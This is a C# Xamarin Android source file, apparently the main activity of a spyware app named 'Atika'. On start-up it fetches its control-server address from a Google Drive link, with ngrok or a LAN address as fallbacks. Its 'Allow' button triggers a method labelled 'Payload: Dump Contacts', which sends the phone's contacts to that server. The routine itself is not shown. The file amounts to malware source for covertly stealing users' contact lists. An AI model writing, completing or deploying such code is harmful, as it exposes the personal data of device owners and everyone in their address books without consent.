using Android.App;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using AndroidX.AppCompat.App;

using System;
using System.IO;

namespace Atika
{
    [Activity(Label = "@string/app_name", Theme = "@style/AppTheme.NoActionBar", MainLauncher = true)]
    public partial class MainActivity : AppCompatActivity
    {
        // [ Server Links ]
        readonly string lanServer = "http://192.168.0.100:80";
        string Server = "http://ngrok.com";
        readonly string serverLocationLink = "https://drive.google.com/uc?export=download&id=1z0OKCBAsxR_K5iCZVbth6V1zKFiF15oQ";

        // [ Temporary Paths ]
        string tempServerPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "serverPath.txt");
        string tempContactsPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "contactsPath.txt");

        // [ Services ]
        ContactService_Android contactService_Android = new ContactService_Android();
        Payloads paylaods = new Payloads();
        Internet internet = new Internet();

        // [ Required Permsissions ]
        // For Base not to Payloads

        // [ Development / Debugging ]
        readonly bool isDevelopment = false;

        protected override void OnCreate(Bundle savedInstanceState)
        {
            // [ Starting Point ]

            base.OnCreate(savedInstanceState);
            Xamarin.Essentials.Platform.Init(this, savedInstanceState);
            SetContentView(Resource.Layout.activity_main);

            // Set Main Button's Function
            FindViewById<Button>(Resource.Id.AllowBTN).Click += AllowBTNOnClick;

            // Connecting to Server
            if (isDevelopment)
                Server = lanServer;
            else
                Server = internet.Connect(serverLocationLink, tempServerPath);
        }

        public override bool OnCreateOptionsMenu(IMenu menu)
        {
            MenuInflater.Inflate(Resource.Menu.menu_main, menu);
            return true;
        }

        // Mail Button CLick Event
        private void AllowBTNOnClick(object sender, EventArgs eventArgs)
        {
            // [ Payload: Dump Contacts ]
            paylaods.DumpContacts(this, contactService_Android, Server, tempContactsPath, 2000);
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Android.Content.PM.Permission[] grantResults)
        {
            Xamarin.Essentials.Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }
}
